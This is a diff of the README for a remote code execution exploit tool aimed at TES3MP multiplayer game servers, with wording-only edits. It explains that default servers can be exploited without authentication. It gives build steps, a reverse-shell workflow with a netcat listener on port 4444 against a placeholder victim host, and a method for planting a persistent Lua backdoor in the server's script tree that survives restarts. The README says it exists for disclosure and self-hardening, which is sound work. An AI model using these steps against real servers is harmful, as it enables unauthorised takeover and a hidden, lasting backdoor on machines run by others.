@@ -8,7 +8,7 @@ the server runs under.
 > exists for coordinated disclosure to TES3MP upstream and for hardening the author's own deployment.
 > Do not point it at a server you do not own or lack written permission to test.
 
-## What it needs, and what it does not
+## Requirements
 
 | Requirement | Needed? |
 |---|---|
@@ -20,7 +20,7 @@ the server runs under.
 | A prior login of any kind | **no** |
 | Any file from the target box | **no**: libc base is resolved over the wire; `system`'s per-build offset comes from a table of public distro packages (`--system-off`/`--libc` for a glibc not in it) |
 
-The distinction is easy to get wrong. TES3MP has **two independent secrets**:
+TES3MP has **two independent secrets**:
 
 1. **The server password**, one shared string, set by the admin in the server config, checked in C++ at
    `ID_SYSTEM_HANDSHAKE` (`apps/openmw-mp/Networking.cpp:118`). A wrong value gets the client kicked before
@@ -30,13 +30,13 @@ The distinction is easy to get wrong. TES3MP has **two independent secrets**:
    registers, never logs in, and no account file is ever created. The C++ packet layer gates on the
    handshake and `POSTLOADED` only, and never consults the Lua-side account state.
 
-So the accurate severity statement is:
+So:
 
 * **Default-configured server (no `password` set): unauthenticated remote code execution.** No secret of
   any kind is required.
 * **Passworded server: remote code execution for anyone who knows the server password**, i.e. every
   player who can connect at all, including players who have never created an account. A shared connection
-  password is not an authorization boundary; it is the ticket to the front door that every player already has.
+  password gates who can connect, not what they can do, and every player holds it.
 
 All four cases were measured rather than reasoned about (`evidence/server-password-matrix.txt`):
 
@@ -56,7 +56,7 @@ commitHash`, identical for every stock client of a given build, and is a version
 make
 ```
 
-That is the whole thing. On first run it clones **CrabNet** (TES3MP's RakNet fork) at the exact commit
+On first run it clones **CrabNet** (TES3MP's RakNet fork) at the exact commit
 TES3MP 0.8.1 links, builds only its static library, and then builds the exploit. Takes a few minutes once,
 then seconds thereafter.
 
@@ -64,14 +64,14 @@ Requires `g++` (C++17), `cmake`, `make`, `git`, and **network access for the fir
 
 Builds on Linux (GCC 13+) and macOS (Apple clang). CrabNet is a 2020 codebase, so the Makefile force-includes `<cstdint> <cstdlib> <cstring>` (modern toolchains no longer pull them in transitively) and passes `-DCMAKE_POLICY_VERSION_MINIMUM=3.5` (CMake 4.x dropped the pre-3.5 compatibility that CrabNet's bundled PVS-Studio module still declares). Both are handled for you; they are called out only so the cause is obvious if you re-run the cmake step by hand.
 
-### What it depends on, and why you do not have to go and get it
+### Dependencies
 
 | Dependency | How it is handled |
 |---|---|
-| `NetworkMessages.hpp` (the packet-ID enum) | **vendored** in `third_party/tes3mp/`. It is the only file needed from TES3MP, so cloning a whole game engine for one enum would be silly. GPLv3, which is why this repo is GPLv3. |
+| `NetworkMessages.hpp` (the packet-ID enum) | **vendored** in `third_party/tes3mp/`. It is the only file needed from TES3MP, so the repo does not clone a game engine for one enum. GPLv3, which is why this repo is GPLv3. |
 | CrabNet (RakNet fork: transport, `BitStream`, Huffman string compression) | **fetched and built by `make`**, pinned to commit `19e66190`. BSD licensed. Not vendored because it has to be *linked*, and the artefact is a 17 MB platform-specific `.a`. |
 
-The CrabNet pin is load-bearing: the wire format, reliability layer and string compressor must match what
+The CrabNet pin must match: the wire format, reliability layer and string compressor have to agree with what
 the target server links, or the client never completes a handshake.
 
 ### Building offline, or against trees you already have
@@ -165,7 +165,7 @@ so the next string operations inside the server run garbage. That is inherent to
 and it is independent of the payload: a marker `touch` crashes it just as a shell does. So do not point the
 full run at a server you are not willing to see go down and restart.
 
-`--probe` exists for exactly this. It connects both clients, completes the handshake (including the server
+`--probe` covers this. It connects both clients, completes the handshake (including the server
 password), joins a cell, reports that it reached the point where the exploit would begin, and **stops
 without touching server memory**. Run it first to confirm a target is reachable and your `-P` is right,
 safely, against even a live server:
@@ -205,7 +205,7 @@ nc -lvnp 4444
   victim.example.net
 ```
 
-Three details, each of them required:
+All three of these are required:
 
 * **The trailing `&` is mandatory.** `system()` blocks until the command finishes. Without it the server's
   packet loop stalls for as long as the shell is open, and the shell's eventual exit status is then used as
@@ -219,10 +219,10 @@ Three details, each of them required:
 ### Persistent shell against an egress-sealed target (`tools/rce.lua`)
 
 A reverse shell needs the target to open a **new outbound** connection, which an egress-filtering DMZ
-drops. When that is the case, ride the **inbound game flow** instead: the one channel that is open by
-definition, because players connect on it.
+drops. When that is the case, ride the **inbound game flow** instead, the channel that is open by
+definition because players connect on it.
 
-The way to do that is not a socket-level trick but the server's own script loader. `system()` writes a
+The mechanism is the server's own script loader rather than a socket-level trick. `system()` writes a
 Lua module into the server's `scripts/custom/` and appends one `require` line to `customScripts.lua`.
 The exploit crashes the server seconds later (see the crash note above), `systemd` restarts it, and the
 restarted process loads the module as part of its normal startup. From then on the backdoor runs inside a
@@ -243,13 +243,12 @@ a chat command in, command output back as server messages.
 ./tes3mp-rce --shell -P '<server password>' -n rce -c 'id' <host>
 ```
 
-Two properties need stating explicitly, because they are the difference between this and the
-exploit chain:
+Two properties separate this from the exploit chain:
 
 * **`--shell` needs a user account, and the exploit chain does not.** CoreScripts gates chat on
   `IsLoggedIn()`, and command hooks dispatch from that callback, so the client registers on first use and
   leaves `data/player/<name>.json` on the target. That is persistent state the memory-corruption path never
-  creates. It is also the loudest thing this tool does.
+  creates. Nothing else in this tool writes to the target's disk.
 * **It survives restarts, and it is not memory-resident.** Re-entry touches no server memory, so it works
   after a reboot and can be used repeatedly without re-running the chain. The flip side is that it is on
   disk, in the server's own script tree, where a file listing or a config-management converge will find it.
@@ -269,15 +268,15 @@ idea (skape; Metasploit `reuse` / `find_tag`) adapted to a shared UDP socket.
 It is removed, because it does not survive a realistic target. The stager is a child of the server it was
 injected into, so it lands in that unit's cgroup, and systemd's default `KillMode=control-group` SIGKILLs
 the whole cgroup when the crashed unit is restarted. Port-squatting the game socket therefore loses the
-race against the restart it depends on. The Lua route wins precisely because it stops fighting the restart
-and uses it as the loader.
+race against the restart it depends on. The Lua route treats that restart as the loader rather than
+something to survive.
 
 </details>
 
 **Expect the server process to die shortly after the exploit fires**, backdoor or not. `strlen` remains
-hijacked, so the next few string operations inside the server misbehave. That crash is load-bearing for the
-install, since it is what triggers the restart that loads the module. This is also why the disclosure PoC
-uses the marker payload instead: it proves execution without leaving the service in a broken state.
+hijacked, so the next few string operations inside the server misbehave. The install depends on that
+crash, since the restart is what loads the module. This is also why the disclosure PoC uses the marker
+payload instead: it proves execution without leaving the service in a broken state.
 
 ## How it works
 
